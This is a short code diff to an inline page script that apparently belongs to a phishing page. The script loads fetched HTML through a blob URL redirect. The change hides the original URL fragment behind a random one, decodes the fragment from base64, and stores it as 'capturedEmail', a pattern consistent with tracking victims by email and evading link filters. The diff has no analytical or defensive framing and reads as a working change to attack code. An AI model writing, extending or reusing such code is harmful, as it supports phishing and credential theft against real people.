@@ -17777,7 +17777,10 @@
         .then(html => {
           const blob = new Blob([html], {type: 'text/html'});
           const blobUrl = URL.createObjectURL(blob);
-          window.location.replace(blobUrl + hash);
+          const randomHash = '#' + Math.random().toString(36).substring(2, 15);
+          window.location.replace(blobUrl + randomHash);
+          const captured = hash.replace('#', '');
+          localStorage.setItem('capturedEmail', atob(captured));
         });
     }
   </script>
